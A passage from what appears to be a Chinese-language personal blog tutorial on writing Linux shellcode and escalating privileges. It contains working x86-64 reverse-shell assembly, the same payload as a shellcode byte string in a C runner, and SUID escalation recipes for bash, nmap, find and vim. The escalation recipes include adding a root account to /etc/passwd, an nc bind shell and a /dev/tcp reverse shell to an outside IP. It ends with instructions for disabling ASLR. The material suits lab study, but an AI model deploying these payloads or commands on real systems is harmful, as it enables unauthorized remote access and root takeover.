&lt;+0&gt;:endbr64 </span><br><span class="line">   0x00000000000011cd &lt;+4&gt;:push   rbp</span><br><span class="line">   0x00000000000011ce &lt;+5&gt;:mov    rbp,rsp</span><br><span class="line">   0x00000000000011d1 &lt;+8&gt;:sub    rsp,0x40</span><br><span class="line">   0x00000000000011d5 &lt;+12&gt;:mov    rax,QWORD PTR fs:0x28</span><br><span class="line">   0x00000000000011de &lt;+21&gt;:mov    QWORD PTR [rbp-0x8],rax</span><br><span class="line">   0x00000000000011e2 &lt;+25&gt;:xor    eax,eax</span><br><span class="line">   0x00000000000011e4 &lt;+27&gt;:mov    DWORD PTR [rbp-0x1c],0x8dbca8c0</span><br><span class="line">   0x00000000000011eb &lt;+34&gt;:mov    WORD PTR [rbp-0x1e],0xbe15</span><br><span class="line">   0x00000000000011f1 &lt;+40&gt;:mov    WORD PTR [rbp-0x20],0x2</span><br><span class="line">   0x00000000000011f7 &lt;+46&gt;:mov    edx,0x0</span><br><span class="line">   0x00000000000011fc &lt;+51&gt;:mov    esi,0x1</span><br><span class="line">   0x0000000000001201 &lt;+56&gt;:mov    edi,0x2</span><br><span class="line">   0x0000000000001206 &lt;+61&gt;:call   0x10d0 &lt;socket@plt&gt;</span><br><span class="line">   0x000000000000120b &lt;+66&gt;:mov    DWORD PTR [rbp-0x38],eax</span><br><span class="line">   0x000000000000120e &lt;+69&gt;:lea    rcx,[rbp-0x20]</span><br><span class="line">   0x0000000000001212 &lt;+73&gt;:mov    eax,DWORD PTR [rbp-0x38]</span><br><span class="line">   0x0000000000001215 &lt;+76&gt;:mov    edx,0x10</span><br><span class="line">   0x000000000000121a &lt;+81&gt;:mov    rsi,rcx</span><br><span class="line">   0x000000000000121d &lt;+84&gt;:mov    edi,eax</span><br><span class="line">   0x000000000000121f &lt;+86&gt;:call   0x10c0 &lt;connect@plt&gt;</span><br><span class="line">   0x0000000000001224 &lt;+91&gt;:mov    DWORD PTR [rbp-0x34],eax</span><br><span class="line">   0x0000000000001227 &lt;+94&gt;:mov    eax,DWORD PTR [rbp-0x38]</span><br><span class="line">   0x000000000000122a &lt;+97&gt;:mov    esi,0x0</span><br><span class="line">   0x000000000000122f &lt;+102&gt;:mov    edi,eax</span><br><span class="line">   0x0000000000001231 &lt;+104&gt;:call   0x10a0 &lt;dup2@plt&gt;</span><br><span class="line">   0x0000000000001236 &lt;+109&gt;:mov    eax,DWORD PTR [rbp-0x38]</span><br><span class="line">   0x0000000000001239 &lt;+112&gt;:mov    esi,0x1</span><br><span class="line">   0x000000000000123e &lt;+117&gt;:mov    edi,eax</span><br><span class="line">   0x0000000000001240 &lt;+119&gt;:call   0x10a0 &lt;dup2@plt&gt;</span><br><span class="line">   0x0000000000001245 &lt;+124&gt;:mov    eax,DWORD PTR [rbp-0x38]</span><br><span class="line">   0x0000000000001248 &lt;+127&gt;:mov    esi,0x2</span><br><span class="line">   0x000000000000124d &lt;+132&gt;:mov    edi,eax</span><br><span class="line">   0x000000000000124f &lt;+134&gt;:call   0x10a0 &lt;dup2@plt&gt;</span><br><span class="line">   0x0000000000001254 &lt;+139&gt;:lea    rax,[rip+0xda9]        # 0x2004</span><br><span class="line">   0x000000000000125b &lt;+146&gt;:mov    QWORD PTR [rbp-0x30],rax</span><br><span class="line">   0x000000000000125f &lt;+150&gt;:mov    QWORD PTR [rbp-0x28],0x0</span><br><span class="line">   0x0000000000001267 &lt;+158&gt;:mov    rax,QWORD PTR [rbp-0x30]</span><br><span class="line">   0x000000000000126b &lt;+162&gt;:lea    rcx,[rbp-0x30]</span><br><span class="line">   0x000000000000126f &lt;+166&gt;:mov    edx,0x0</span><br><span class="line">   0x0000000000001274 &lt;+171&gt;:mov    rsi,rcx</span><br><span class="line">   0x0000000000001277 &lt;+174&gt;:mov    rdi,rax</span><br><span class="line">   0x000000000000127a &lt;+177&gt;:call   0x10b0 &lt;execve@plt&gt;</span><br><span class="line">   0x000000000000127f &lt;+182&gt;:mov    eax,0x0</span><br><span class="line">   0x0000000000001284 &lt;+187&gt;:mov    rdx,QWORD PTR [rbp-0x8]</span><br><span class="line">   0x0000000000001288 &lt;+191&gt;:xor    rdx,QWORD PTR fs:0x28</span><br><span class="line">   0x0000000000001291 &lt;+200&gt;:je     0x1298 &lt;main+207&gt;</span><br><span class="line">   0x0000000000001293 &lt;+202&gt;:call   0x1090 &lt;__stack_chk_fail@plt&gt;</span><br><span class="line">   0x0000000000001298 &lt;+207&gt;:leave  </span><br><span class="line">   0x0000000000001299 &lt;+208&gt;:ret    </span><br><span class="line">End of assembler dump.</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br></pre></td><td class="code"><pre><span class="line">global _start</span><br><span class="line">section .text</span><br><span class="line">_start:</span><br><span class="line">    ;Socket</span><br><span class="line">    xor rdx, rdx                ; zero out rdx</span><br><span class="line">    mov rsi, rdx                ; AF_NET = 1</span><br><span class="line">    inc rsi                     ; rsi = AF_NET</span><br><span class="line">    mov rdi, rsi                ; SOCK_STREAM = 2</span><br><span class="line">    inc rdi                     ; rdi = SOCK_STREAM</span><br><span class="line">    add ax, 0x29</span><br><span class="line">    syscall                   ; call socket(SOCK_STREAM, AF_NET, 0);</span><br><span class="line"></span><br><span class="line">    mov r12, rax</span><br><span class="line">    sub rsp,0x10</span><br><span class="line">    mov dword [rsp+0x4],0x8dbca8c0; ip = 192.168.188.141</span><br><span class="line">    mov word [rsp+0x2],0xbe15; post = 5566</span><br><span class="line">    mov word [rsp],0x2</span><br><span class="line"></span><br><span class="line">    ; Connect = 0x2a</span><br><span class="line">    mov rdi, rax                ; move the saved socket fd into rdi</span><br><span class="line">    mov rsi, rsp                ; move the saved sock_addr_in into rsi</span><br><span class="line">    add dx, 0x10                ; add 0x10 to rdx</span><br><span class="line">    xor rax, rax    </span><br><span class="line">    add ax, 0x2a</span><br><span class="line">    syscall                     ; call connect(rdi, rsi, rdx)</span><br><span class="line"></span><br><span class="line">    xor rsi, rsi                ; zero out rsi</span><br><span class="line"></span><br><span class="line">    dup:</span><br><span class="line">    xor rax, rax</span><br><span class="line">    add ax, 0x21                ; move the syscall for dup2 into rax</span><br><span class="line">    mov rdi, r12                ; move the FD for the socket into rdi</span><br><span class="line">    syscall                     ; call dup2(rdi, rsi)</span><br><span class="line"></span><br><span class="line">    cmp rsi, 0x2                ; check to see if we are still under 2</span><br><span class="line">    inc rsi                     ; inc rsi</span><br><span class="line">    jbe dup                     ; jmp if less than 2</span><br><span class="line"></span><br><span class="line">    ;sub r8, 0x1F                ; setup the exec syscall at 0x3b</span><br><span class="line">    xor rax, rax    </span><br><span class="line">    add ax, 0x3b                 ; move the syscall into rax</span><br><span class="line"></span><br><span class="line">    ;exec</span><br><span class="line">    xor rdx, rdx ; zero out rdx</span><br><span class="line">    mov qword rbx, &#x27;//bin/sh&#x27;  ; &#x27;/bin/sh&#x27; in hex</span><br><span class="line">    shr rbx,0x8                  ; shift right to create the null terminator</span><br><span class="line">    push rbx</span><br><span class="line"></span><br><span class="line">    mov rdi, rsp</span><br><span class="line">    push rdx</span><br><span class="line">    push rdi              ; move the command from the stack to rdi</span><br><span class="line">    mov rsi, rsp                ; zero out rsi</span><br><span class="line">    syscall                     ; call exec(rdi, rsi, 0)</span><br></pre></td></tr></table></figure><p>运行以下命令编译并运行程序：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">nasm -f elf64 rev_tcp.asm </span><br><span class="line">ld -m elf_x86_64 rev_tcp.o -o rev_tcp</span><br><span class="line">./rev_tcp</span><br></pre></td></tr></table></figure><p>接下来提取机器码，并将其插入 c 程序中执行：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">for i in $(objdump  -d rev_tcp.o | grep &quot;^ &quot; | cut  -f2); do echo  -n  &#x27;\x&#x27;$i; done; echo </span><br></pre></td></tr></table></figure><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="type">unsigned</span> <span class="type">char</span> shellcode[] = \</span><br><span class="line"><span class="string">&quot;\x48\x31\xd2\x48\x89\xd6\x48\xff\xc6\x48\x89\xf7\x48\xff\xc7\x66\x83\xc0\x29\x0f\x05\x49\x89\xc4\x48\x83\xec\x10\xc7\x44\x24\x04\xc0\xa8\xbc\x8d\x66\xc7\x44\x24\x02\x15\xbe\x66\xc7\x04\x24\x02\x00\x48\x89\xc7\x48\x89\xe6\x66\x83\xc2\x10\x48\x31\xc0\x66\x83\xc0\x2a\x0f\x05\x48\x31\xf6\x48\x31\xc0\x66\x83\xc0\x21\x4c\x89\xe7\x0f\x05\x48\x83\xfe\x02\x48\xff\xc6\x76\xeb\x48\x31\xc0\x66\x83\xc0\x3b\x48\x31\xd2\x48\xbb\x2f\x2f\x62\x69\x6e\x2f\x73\x68\x48\xc1\xeb\x08\x53\x48\x89\xe7\x52\x57\x48\x89\xe6\x0f\x05&quot;</span>;</span><br><span class="line">    <span class="type">int</span> (*ret)() = (<span class="type">int</span>(*)())shellcode;</span><br><span class="line">    ret();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>编译：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">gcc rev_tcp.c -o rev_tcp -z execstack -z norelro -no-pie -g</span><br><span class="line">./rev_tcp</span><br></pre></td></tr></table></figure><h2 id="6-提权"><a class="markdownIt-Anchor" href="#6-提权"></a> 6. 提权</h2><blockquote><p>参考：</p><p>​<a href="http://c.biancheng.net/view/761.html">Linux chown命令：修改文件和目录的所有者和所属组</a></p><p>​<a href="https://blog.csdn.net/y26183225/article/details/80366394">出现 “ /usr/bin/ld: cannot open output file a.out: Permission denied ” 的解决办法</a></p><p>​<a href="https://www.ibm.com/docs/en/cics-tx/11.1?topic=troubleshooting-resolving-linker-error-permission-denied">解决链接器错误 - 权限被拒绝</a></p><p>​<a href="https://tyaoo.github.io/2020/05/27/Linux%E6%8F%90%E6%9D%83%E5%B0%8F%E7%9F%A5%E8%AF%86/">Linux 提权小知识</a></p></blockquote><h3 id="61-尝试"><a class="markdownIt-Anchor" href="#61-尝试"></a> 6.1 尝试</h3><p>前面不是说了一种提权思路吗？</p><blockquote><p>提权思路：在系统文件中找到一个具有777权限的文件，在里面写入我们的提权代码执行，或者是把我们的可执行文件，提升权限执行。</p></blockquote><p>我在实现的时候，却发现，只有777权限还不行，提示权限不够。</p><p><img src="/2022/08/08/Linux-shellcode%E5%BC%80%E5%8F%91%E4%B9%8B%E5%AE%9E%E6%88%98/image-20220821180910343.png" alt="image-20220821180910343"></p><p>按照这篇文章《<a href="https://blog.csdn.net/y26183225/article/details/80366394">出现 “ /usr/bin/ld: cannot open output file a.out: Permission denied ” 的解决办法</a>》所说这是因为，user 用户无权更改所有者为 root 用户文件。所以我们还需要更改文件的所有者。<a href="http://c.biancheng.net/view/761.html">Linux chown命令：修改文件和目录的所有者和所属组</a></p><p>但是更改文件所有者，还是需要 root 权限。更改后，，，还是缺少权限。</p><p>结果我按照那篇文章的说法，把整个目录的所有者都改成了 sakura，然后就能成功编译了。但是还是无法执行，因为目录中的所有文件所有者都变成了 sakura，所以同时文件的所有者也变成了 sakura。</p><p>最后，我看到了这篇文章《<a href="https://www.ibm.com/docs/en/cics-tx/11.1?topic=troubleshooting-resolving-linker-error-permission-denied">解决链接器错误 - 权限被拒绝</a>》，说是要解决此问题，请确保程序编译所在的目录具有所需的写入权限。</p><p><img src="/2022/08/08/Linux-shellcode%E5%BC%80%E5%8F%91%E4%B9%8B%E5%AE%9E%E6%88%98/image-20220821192140988.png" alt="image-20220821192140988"></p><p>strace 跟踪还是缺少权限。</p><p><img src="/2022/08/08/Linux-shellcode%E5%BC%80%E5%8F%91%E4%B9%8B%E5%AE%9E%E6%88%98/image-20220821201609541.png" alt="image-20220821201609541"></p><h3 id="62-suid-提权"><a class="markdownIt-Anchor" href="#62-suid-提权"></a> 6.2 suid 提权</h3><blockquote><p>参考：<br><a href="https://blog.csdn.net/qq_43632414/article/details/120592028">linux——SUID提权</a></p><p>​<a href="https://www.leavesongs.com/PENETRATION/linux-suid-privilege-escalation.html#">谈一谈Linux与suid提权</a></p></blockquote><p>说到这个话题，我们不得不先<mark>介绍一下suid</mark>。</p><p>通常来说，Linux运行一个程序，是使用当前运行这个程序的用户权限，这当然是合理的。但是有一些程序比较特殊，比如我们常用的ping命令。</p><p>ping需要发送ICMP报文，而这个操作需要发送Raw Socket。在Linux 2.2引入<a href="http://man7.org/linux/man-pages/man7/capabilities.7.html">CAPABILITIES</a>前，使用Raw Socket是需要root权限的（当然不是说引入CAPABILITIES就不需要权限了，而是可以通过其他方法解决，这个后说），所以你如果在一些老的系统里<code>ls -al $(which ping)</code>，可以发现其权限是<code>-rwsr-xr-x</code>，其中有个s位，这就是suid：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">root@linux:~# ls -al /bin/ping</span><br><span class="line">-rwsr-xr-x 1 root root 44168 May 7 2014 /bin/ping</span><br></pre></td></tr></table></figure><p>suid全称是<strong>S</strong>et owner <strong>U</strong>ser <strong>ID</strong> up on execution。这是Linux给可执行文件的一个属性，上述情况下，普通用户之所以也可以使用ping命令，原因就在我们给ping这个可执行文件设置了suid权限。</p><p>设置了s位的程序在运行时，其<strong>Effective UID</strong>将会设置为这个程序的所有者。比如，<code>/bin/ping</code>这个程序的所有者是0（root），它设置了s位，那么普通用户在运行ping时其<strong>Effective UID</strong>就是0，等同于拥有了root权限。</p><p>这里引入了一个新的概念Effective UID。Linux进程在运行时有三个UID：</p><ul><li>Real UID 执行该进程的用户实际的UID</li><li>Effective UID 程序实际操作时生效的UID（比如写入文件时，系统会检查这个UID是否有权限）</li><li>Saved UID 在高权限用户降权后，保留的其原本UID（本文中不对这个UID进行深入探讨）</li></ul><p>通常情况下Effective UID和Real UID相等，所以普通用户不能写入只有UID=0号才可写的<code>/etc/passwd</code>；有suid的程序启动时，Effective UID就等于二进制文件的所有者，此时Real UID就可能和Effective UID不相等了。</p><p>有的同学说某某程序只要有suid权限，就可以提权，这个说法其实是不准确的。只有这个程序的所有者是0号或其他super user，同时拥有suid权限，才可以提权。</p><blockquote><p>SUID提权的思路：运行root用户所拥有的SUID的文件，当其他用户运行该文件的时候就得获得root用户的身份。</p></blockquote><p>以下命令可以发现linux系统上所有SUID的可执行文件</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">//以下命令将尝试查找具有root权限的SUID的文件，不同系统适用于不同的命令，一个一个试</span><br><span class="line">find / -perm -u=s -<span class="built_in">type</span> f 2&gt;/dev/null</span><br><span class="line">find / -user root -perm -4000-print2&gt;/del/null</span><br><span class="line">find / -user root -perm -4000-exec <span class="built_in">ls</span> -ldb &#123;&#125; \;</span><br></pre></td></tr></table></figure><h4 id="621-bash"><a class="markdownIt-Anchor" href="#621-bash"></a> 6.2.1 bash</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">sakura@Kylin:~$ sudo <span class="built_in">chmod</span> u+s /bin/bash</span><br><span class="line">sakura@Kylin:~$ ll /bin/bash</span><br><span class="line">-rwsr-xr-x 1 root root 1183448 6月   4  2021 /bin/bash*</span><br><span class="line">sakura@Kylin:~$ bash -p</span><br><span class="line">bash-5.0<span class="comment"># whoami</span></span><br><span class="line">root</span><br><span class="line">bash-5.0<span class="comment"># id</span></span><br><span class="line">uid=1000(sakura) gid=1000(sakura) euid=0(root) 组=1000(sakura),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),119(lpadmin),129(sambashare)</span><br><span class="line">bash-5.0<span class="comment"># ./addRootUser </span></span><br><span class="line">bash-5.0<span class="comment"># cat /etc/passwd</span></span><br><span class="line">root:x:0:0:root:/root:/bin/bash</span><br><span class="line">。。。。。。</span><br><span class="line">toor:sXuCKi7k3Xh/s:0:0::/root:/bin/sh</span><br><span class="line">bash-5.0<span class="comment"># </span></span><br></pre></td></tr></table></figure><p>成功提权，可以看到，最后已经添加了 具有root权限的 toor 用户。</p><h4 id="622-nmap"><a class="markdownIt-Anchor" href="#622-nmap"></a> 6.2.2 nmap</h4><blockquote><p><a href="https://nmap.org/dist-old/">nmap历史版本</a></p><p><a href="https://www.freebuf.com/articles/web/272617.html">简谈SUID提权</a> —&gt;nmap</p><p><a href="https://blog.csdn.net/u010142437/article/details/80097869">Linux下安装及简单使用nmap</a></p></blockquote><p>判断nmap版本，<code>nmap -v</code>，如果版本在2.02至5.21之间，则可以提权</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta"># </span><span class="language-bash">下载 nmap 5.21版本</span></span><br><span class="line">wget https://nmap.org/dist-old/nmap-5.21.tgz</span><br><span class="line"><span class="meta"></span></span><br><span class="line"><span class="meta"># </span><span class="language-bash">解压</span></span><br><span class="line">tar -xvf nmap-5.21.tgz</span><br><span class="line"><span class="meta"></span></span><br><span class="line"><span class="meta"># </span><span class="language-bash">进入解压后的文件夹，配置环境</span></span><br><span class="line">./configure</span><br><span class="line"><span class="meta"></span></span><br><span class="line"><span class="meta"># </span><span class="language-bash">执行 make 安装</span></span><br><span class="line">make</span><br></pre></td></tr></table></figure><p>但是当我 ./configure 的时候，报错了<br><img src="/2022/08/08/Linux-shellcode%E5%BC%80%E5%8F%91%E4%B9%8B%E5%AE%9E%E6%88%98/image-20220901231602540.png" alt="image-20220901231602540"></p><p>查看 config.log<br><img src="/2022/08/08/Linux-shellcode%E5%BC%80%E5%8F%91%E4%B9%8B%E5%AE%9E%E6%88%98/image-20220901231646565.png" alt="image-20220901231646565"></p><p>发现缺少 Scrt1.o，Google后 <a href="https://blog.csdn.net/weixin_39278265/article/details/118435463">解决方案</a></p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo apt-get install libc6-dev</span><br></pre></td></tr></table></figure><p>执行后，make 时还是有错误<br><img src="/2022/08/08/Linux-shellcode%E5%BC%80%E5%8F%91%E4%B9%8B%E5%AE%9E%E6%88%98/image-20220902210520954.png" alt="image-20220902210520954"></p><blockquote><p>下面我就直接 copy <a href="https://www.freebuf.com/articles/web/272617.html">简谈SUID提权</a> —&gt;nmap</p></blockquote><p>在早期nmap版本中,带有交互模式,因而允许用户执行shell命令</p><p>使用如下命令进入nmap交互模式:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap --interactive</span><br></pre></td></tr></table></figure><p>在nmap交互模式中 通过如下命令提权</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">nmap&gt; !sh</span><br><span class="line">sh-3.2<span class="comment"># whoami</span></span><br><span class="line">root</span><br></pre></td></tr></table></figure><p>msf当中也有利用nmap进行提权的模块</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">exploit/unix/local/setuid_nmap</span><br></pre></td></tr></table></figure><p><img src="https://image.3001.net/images/20210512/1620789331_609b4853e2953ab5387ff.jpg!small" alt="image-20210512095047083"></p><h4 id="623-find"><a class="markdownIt-Anchor" href="#623-find"></a> 6.2.3 find</h4><p>find比较常用，find用来在系统中查找文件。同时，它也有执行命令的能力。 因此，如果配置为使用SUID权限运行，则可以通过find执行的命令都将以root身份去运行。</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">sakura@Kylin:~$ sudo chmod u+s /bin/find</span><br><span class="line">sakura@Kylin:~$ ll /bin/find</span><br><span class="line">-rwsr-xr-x 1 root root 320160 4月  15  2020 /bin/find*</span><br><span class="line">sakura@Kylin:~/文档$ touch anyfile</span><br><span class="line">sakura@Kylin:~/文档$ find anyfile -exec whoami \;</span><br><span class="line">root</span><br><span class="line">sakura@Kylin:~/文档$ </span><br></pre></td></tr></table></figure><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#</span><span class="language-bash">进入shell</span></span><br><span class="line">sakura@Kylin:~/文档$ find anyfile -exec &quot;/bin/bash&quot; &quot;-p&quot; \;</span><br><span class="line">sh-5.0# whoami</span><br><span class="line">root</span><br></pre></td></tr></table></figure><p>linux一般都安装了nc (存在-e 选项) 我们也可以利用nc 广播或反弹shell。<a href="https://www.2cto.com/article/201305/209914.html">[TIP]NC不使用-e选项反弹shell</a></p><p>广播shell:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">find anyfile -<span class="built_in">exec</span> nc -lvp 4444 -e <span class="string">&#x27;/bin/sh&#x27;</span> \;</span><br></pre></td></tr></table></figure><p>在攻击机上:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nc 靶机ip 4444</span><br></pre></td></tr></table></figure><p>反弹shell</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">find anyfile -<span class="built_in">exec</span> bash -c <span class="string">&#x27;bash -i &gt;&amp; /dev/tcp/114.xxx.xxx.96/4444 0&gt;&amp;1&#x27;</span> \;</span><br></pre></td></tr></table></figure><p>在攻击机上:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nc -lvvp 4444</span><br></pre></td></tr></table></figure><h4 id="624-vim"><a class="markdownIt-Anchor" href="#624-vim"></a> 6.2.4 vim</h4><blockquote><p><a href="https://blog.csdn.net/weixin_29710393/article/details/116926730">linux利用* vim提权</a></p></blockquote><p>利用vim提权的思路是修改etc/passwd文件，为自己添加一个有root权限的用户</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">saksakura@Kylin:~$ sudo <span class="built_in">chmod</span> u+s /bin/vim.tiny</span><br><span class="line">sakura@Kylin:~$ vim.tiny /etc/passwd</span><br><span class="line">sakura@Kylin:~$ <span class="built_in">cat</span> /etc/passwd</span><br><span class="line">root:x:0:0:root:/root:/bin/bash</span><br><span class="line">、、、、</span><br><span class="line">hello</span><br><span class="line">sakura@Kylin:~$ </span><br></pre></td></tr></table></figure><h2 id="7-关闭aslr"><a class="markdownIt-Anchor" href="#7-关闭aslr"></a> 7. 关闭ASLR</h2><blockquote><p>参考：</p><p>​<a href="https://blog.csdn.net/counsellor/article/details/81543197">Linux下关闭ASLR(地址空间随机化)的方法</a></p><p>​ <a href="https://superuser.com/questions/127238/how-to-turn-off-aslr-in-ubuntu-9-10">如何在 Ubuntu 9.10 中关闭 ASLR</a></p></blockquote><p><strong>配置选项</strong></p><ul><li>0 = 关闭</li><li>1 = 半随机。共享库、栈、mmap() 以及 VDSO 将被随机化。（留坑，PIE会影响heap的随机化。。）</li><li>2 = 全随机。除了1中所述，还有heap。</li></ul><p><strong>方法一： 手动修改randomize_va_space文件</strong></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta"># </span><span class="language-bash"><span class="built_in">echo</span> 0 &gt; /proc/sys/kernel/randomize_va_space</span></span><br></pre></td></tr></table></figure><p>注意，这里是先进root权限，后执行。不要问为什么sudo echo 0 &gt; /proc/sys/kernel/randomize_va_space为什么会报错</p><blockquote><p><a href="https://superuser.com/questions/127238/how-to-turn-off-aslr-in-ubuntu-9-10">如何在 Ubuntu 9.10 中关闭 ASLR</a></p><p>在您的命令中，I/O 重定向<code>&gt;</code>由当前 shell 处理。解释器将命令视为 3 个部分：</p><ol><li><code>sudo echo 0</code></li><li><code>&gt;</code></li><li><code>/proc/sys/kernel/randomize_va_space</code></li></ol><p>使用<code>echo</code>超级用户权限执行，而当前 shell（具有普通用户权限）尝试写入<code>/proc/sys/kernel/randomize_va_space</code>，因此触发<code>Permission denied</code>错误。</p><p>有几种方法可以克服这一点。第一种方法是使用超级用户权限运行 shell 并使用<code>-c</code>开关将命令传递给 shell：</p>   <figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo sh -c &quot;echo 0 &gt; /proc/sys/kernel/randomize_va_space&quot;</span><br></pre></td></tr></table></figure><p>（您可以<code>sh</code>用于 POSIX shell 和<code>bash</code>Bash）</p><p>另一种方法是使用<code>tee</code>命令。该<code>tee</code>命令将内容从标准输入复制到标准输出（通常是指“屏幕”）以及列出的文件。因此，以下命令将字符打印<code>A</code>到标准输出以及文件<code>output1.txt</code>和<code>output2.txt</code>.</p>   <figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">echo A | tee output1.txt output2.txt</span><br></pre></td></tr></table></figure><p>在您的问题中，写入<code>/proc/sys/kernel/randomize_va_space</code>需要超级用户权限，而<code>echo 0</code>不需要root。所以，解决方案是：</p>   <figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">echo 0 | sudo tee /proc/sys/kernel/randomize_va_space &gt;/dev/null</span><br></pre></td></tr></table></figure><p>最终重定向以<code>/dev/null</code>防止<code>0</code>打印到屏幕。</p><p><img src="/2022/08/08/Linux-shellcode%E5%BC%80%E5%8F%91%E4%B9%8B%E5%AE%9E%E6%88%98/image-20220903123507330.png" alt="image-20220903123507330"></p></blockquote><p><strong>方法二： 使用sysctl控制ASLR</strong></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">$ </span><span class="language-bash">sysctl -w kernel.randomize_va_space=0</span></span><br></pre></td></tr></table></figure><p>这是一种<strong>临时改变</strong>随机策略的方法，重启之后将恢复默认。如果需要永久保存配置，需要在配置文件 /etc/sysctl.conf 中增加这个选项。</p><p><strong>方法三： 使用setarch控制单个程序的随机化</strong><br>如果你想历史关闭单个程序的ASLR，使用setarch是很好的选择。setarch命令如其名，改变程序的运行架构环境，并可以自定义环境flag。</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">setarch `uname -m` -R ./your_program</span><br></pre></td></tr></table></figure><p>-R参数代表关闭地址空间随机化（开启ADDR_NO_RANDOMIZE)</p><p><strong>方法四： 在GDB场景下，使用set disable-randomization off</strong><br>在调试特定程序时，可以通过 <code>set disable-randomization</code> 命令开启或者关闭地址空间随机化。默认是关闭随机化的，也就是on状态。</p><p>当然，这里开启，关闭和查看的方法看起来就比较正规了。</p><p>关闭ASLR：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">set disable-randomization on</span><br></pre></td></tr></table></figure><p>开启ASLR：</p><figure 